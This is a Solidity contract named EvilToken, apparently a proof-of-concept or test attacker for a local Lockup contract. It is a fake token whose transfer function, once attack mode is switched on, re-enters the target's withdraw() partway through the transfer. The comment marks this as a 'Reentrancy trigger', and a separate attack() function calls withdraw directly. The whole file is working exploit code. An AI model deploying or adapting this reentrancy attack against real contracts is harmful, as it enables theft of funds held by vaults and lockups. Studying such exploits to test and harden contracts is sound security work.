// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Lockup.sol";

contract EvilToken {

    mapping(address => uint256) public balances;
    mapping(address => mapping(address 
    => uint256)) public allowance;
    
Lockup public target;

    bool public attackEnabled;
    bool internal attacking;

    constructor() {
        balances[msg.sender] = 1_000_000 ether;
    }

    function balanceOf(address account)
        external
        view
        returns (uint256)
    {
        return balances[account];
    }
   function approve(
        address spender,
        uint256 amount
    ) external returns (bool) {

    allowance[msg.sender][spender] = amount;

    return true;
}

    function setTarget(address _target) external {
        target = Lockup(_target);
    }

    function setAttack(bool _enabled) external {
        attackEnabled = _enabled;
    }

    function attack() external {
        target.withdraw();
    }

    function transfer(
        address to,
        uint256 amount
    ) external returns (bool) {

        require(
            balances[msg.sender] >= amount,
            "not enough"
        );

        balances[msg.sender] -= amount;
        balances[to] += amount;

        // Reentrancy trigger
        if (
            attackEnabled &&
            !attacking &&
            address(target) != address(0)
        ) {

            attacking = true;

            target.withdraw();

            attacking = false;
        }

        return true;
    }

function transferFrom(
    address from,
    address to,
    uint256 amount
) external returns (bool) {

    require(
        balances[from] >= amount,
        "not enough"
    );

    require(
        allowance[from][msg.sender] >= amount,
        "not approved"
    );

    allowance[from][msg.sender] -= amount;

    balances[from] -= amount;
    balances[to] += amount;

    return true;
   }
}
